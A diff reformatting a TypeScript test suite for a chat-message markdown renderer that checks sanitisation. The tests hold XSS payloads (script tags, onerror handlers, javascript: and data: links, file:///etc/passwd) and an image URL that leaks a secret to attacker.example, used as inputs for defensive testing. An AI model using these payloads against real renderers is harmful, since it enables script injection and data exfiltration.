@@ -11,7 +11,9 @@ function render(text: string, streaming = false) {
 
 describe('message markdown', () => {
   it('renders common text structures and GFM without preserving layout whitespace', () => {
-    const html = render('# 标题\n\n正文 **重点**，`inline()`。\n\n> 一段引用\n\n1. 第一步\n2. 第二步\n\n- [x] 完成\n- [ ] 待办\n\n~~旧内容~~\n\n| 名称 | 结果 |\n| --- | --- |\n| 工具 | 正常 |')
+    const html = render(
+      '# 标题\n\n正文 **重点**，`inline()`。\n\n> 一段引用\n\n1. 第一步\n2. 第二步\n\n- [x] 完成\n- [ ] 待办\n\n~~旧内容~~\n\n| 名称 | 结果 |\n| --- | --- |\n| 工具 | 正常 |',
+    )
     expect(html).toContain('<h1>标题</h1>')
     expect(html).toContain('<strong>重点</strong>')
     expect(html).toContain('<code>inline()</code>')
@@ -25,16 +27,24 @@ describe('message markdown', () => {
   })
 
   it('ignores raw HTML and never turns HTML source inside code into active elements', () => {
-    const html = render('正文\n\n<script>alert(1)</script>\n\n<img src="x" onerror="alert(2)">\n\n<iframe src="https://example.com"></iframe>\n\n```html\n<button onclick="alert(3)">click</button>\n```')
+    const html = render(
+      '正文\n\n<script>alert(1)</script>\n\n<img src="x" onerror="alert(2)">\n\n<iframe src="https://example.com"></iframe>\n\n```html\n<button onclick="alert(3)">click</button>\n```',
+    )
     expect(html).not.toMatch(/<(script|img|iframe|button onclick)/i)
     expect(html).not.toContain('onerror=')
     expect(html).toContain('&lt;button onclick=&quot;alert(3)&quot;&gt;click&lt;/button&gt;')
   })
 
   it.each([
-    'javascript:alert%281%29', 'JaVaScRiPt:alert%281%29', 'jav&#x61;script:alert%281%29',
-    'vbscript:msgbox%281%29', 'data:text/html;base64,PHNjcmlwdD4=', 'file:///etc/passwd',
-    'irc://example.com', 'xmpp:example.com', '//example.com/path',
+    'javascript:alert%281%29',
+    'JaVaScRiPt:alert%281%29',
+    'jav&#x61;script:alert%281%29',
+    'vbscript:msgbox%281%29',
+    'data:text/html;base64,PHNjcmlwdD4=',
+    'file:///etc/passwd',
+    'irc://example.com',
+    'xmpp:example.com',
+    '//example.com/path',
   ])('does not create a navigable link for %s', url => {
     const html = render(`[bad](${url})`)
     expect(html).not.toContain('href=')
@@ -49,7 +59,9 @@ describe('message markdown', () => {
   })
 
   it('allows web, mail and relative links, isolating external navigation', () => {
-    const html = render('[web](https://example.com/a?q=1) [mail](mailto:team@example.com) [local](/link/help) [relative](./report.md) [anchor](#result)')
+    const html = render(
+      '[web](https://example.com/a?q=1) [mail](mailto:team@example.com) [local](/link/help) [relative](./report.md) [anchor](#result)',
+    )
     expect(html).toContain('href="https://example.com/a?q=1" target="_blank" rel="noopener noreferrer"')
     expect(html).toContain('<a href="mailto:team@example.com">mail</a>')
     expect(html).toContain('<a href="/link/help">local</a>')
@@ -58,9 +70,13 @@ describe('message markdown', () => {
   })
 
   it('never loads images: a web image becomes a link the reader opens, others only their alt text', () => {
-    const html = render('![diagram](https://attacker.example/p?d=secret) ![local](/link/api/snapshot) ![unsafe](data:image/svg+xml;base64,PHN2Zz4=) ![](mailto:team@example.com)')
+    const html = render(
+      '![diagram](https://attacker.example/p?d=secret) ![local](/link/api/snapshot) ![unsafe](data:image/svg+xml;base64,PHN2Zz4=) ![](mailto:team@example.com)',
+    )
     expect(html).not.toContain('<img')
-    expect(html).toContain('<a class="message-image" href="https://attacker.example/p?d=secret" target="_blank" rel="noopener noreferrer">外部图片：diagram</a>')
+    expect(html).toContain(
+      '<a class="message-image" href="https://attacker.example/p?d=secret" target="_blank" rel="noopener noreferrer">外部图片：diagram</a>',
+    )
     expect(html).toContain('<span class="message-image">图片：local</span>')
     expect(html).toContain('<span class="message-image">图片：unsafe</span>')
     expect(html).toContain('<span class="message-image">图片：图片</span>')
@@ -98,8 +114,18 @@ describe('message markdown', () => {
     ['ordered lists', '1. '.repeat(3000) + 'a'],
     ['indented lists', Array.from({ length: 400 }, (_, index) => ' '.repeat(index * 2) + '- a').join('\n')],
     ['emphasis', '*'.repeat(6000) + 'a' + '*'.repeat(6000)],
-    ['mixed emphasis', Array.from({ length: 3000 }, (_, index) => index % 2 ? '*a ' : '_a ').join('') + 'x' + Array.from({ length: 3000 }, (_, index) => index % 2 ? ' a_' : ' a*').join('')],
-    ['emphasis that survives the first check', Array.from({ length: 300 }, (_, index) => index % 2 ? '*a ' : '_a ').join('') + 'x' + Array.from({ length: 300 }, (_, index) => index % 2 ? ' a_' : ' a*').join('')],
+    [
+      'mixed emphasis',
+      Array.from({ length: 3000 }, (_, index) => (index % 2 ? '*a ' : '_a ')).join('')
+        + 'x'
+        + Array.from({ length: 3000 }, (_, index) => (index % 2 ? ' a_' : ' a*')).join(''),
+    ],
+    [
+      'emphasis that survives the first check',
+      Array.from({ length: 300 }, (_, index) => (index % 2 ? '*a ' : '_a ')).join('')
+        + 'x'
+        + Array.from({ length: 300 }, (_, index) => (index % 2 ? ' a_' : ' a*')).join(''),
+    ],
     ['lists that survive the first check', '- '.repeat(MAX_LINE_CONTAINERS) + 'a'],
   ])('shows deeply nested %s as plain text instead of overflowing the stack', (_name, text) => {
     const html = render(text, true)
@@ -123,7 +149,16 @@ describe('message markdown', () => {
     expect(MAX_TREE_DEPTH).toBeLessThan(MAX_LINE_CONTAINERS * 2)
     expect(exceedsMarkdownNesting('*'.repeat(MAX_OPEN_DELIMITERS + 1) + 'a' + '*'.repeat(MAX_OPEN_DELIMITERS + 1))).toBe(true)
     expect(renderMarkdown({ children: '>'.repeat(MAX_TREE_DEPTH + 1) + ' a' })).toBeNull()
-    expect(renderMarkdown({ children: 'x', remarkPlugins: [() => () => { throw new Error('plugin failed') }] })).toBeNull()
+    expect(
+      renderMarkdown({
+        children: 'x',
+        remarkPlugins: [
+          () => () => {
+            throw new Error('plugin failed')
+          },
+        ],
+      }),
+    ).toBeNull()
     expect(renderMarkdown({ children: '> a' })).not.toBeNull()
   })
 
@@ -141,14 +176,21 @@ describe('message markdown', () => {
     boundary.state = { ...boundary.state, ...ErrorBoundary.getDerivedStateFromError() }
     expect(boundary.render()).toBe('plain')
     expect(ErrorBoundary.getDerivedStateFromProps({ resetKey: 'a', fallback: 'plain', children: 'markdown' }, boundary.state)).toBeNull()
-    expect(ErrorBoundary.getDerivedStateFromProps({ resetKey: 'ab', fallback: 'plain', children: 'markdown' }, boundary.state)).toEqual({ failed: false, resetKey: 'ab' })
+    expect(ErrorBoundary.getDerivedStateFromProps({ resetKey: 'ab', fallback: 'plain', children: 'markdown' }, boundary.state)).toEqual({
+      failed: false,
+      resetKey: 'ab',
+    })
   })
 
   it('gives footnotes unique ids across messages and retains their local links', () => {
-    const html = renderToStaticMarkup(createElement('div', null,
-      createElement(MessageContent, { text: '第一条[^1]\n\n[^1]: 解释一' }),
-      createElement(MessageContent, { text: '第二条[^1]\n\n[^1]: 解释二' }),
-    ))
+    const html = renderToStaticMarkup(
+      createElement(
+        'div',
+        null,
+        createElement(MessageContent, { text: '第一条[^1]\n\n[^1]: 解释一' }),
+        createElement(MessageContent, { text: '第二条[^1]\n\n[^1]: 解释二' }),
+      ),
+    )
     const noteIds = [...html.matchAll(/id="([^"]+-fn-1)"/g)].map(match => match[1])
     expect(noteIds).toHaveLength(2)
     for (const id of noteIds) expect(html).toContain(`href="#${id}"`)
